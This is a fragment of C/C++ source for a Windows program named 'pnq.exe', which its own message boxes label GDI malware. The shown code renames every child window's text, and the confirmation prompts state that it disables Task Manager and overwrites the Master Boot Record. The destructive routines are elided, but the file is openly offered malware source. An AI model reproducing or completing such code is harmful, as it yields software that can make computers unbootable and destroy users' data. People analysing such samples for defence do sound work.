...
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	...
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"pnq.exe", SMTO_ABORTIFHUNG, 100, NULL);
	return true;
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	if (MessageBoxW(NULL, L"Run GDI Malware?", L"pnq.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will Disables Task Manager and writes 512 bytes to the boot sectors and corrupts MBR this malware is no joke and should only be runned in a isolated envorinment", L"pnq.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
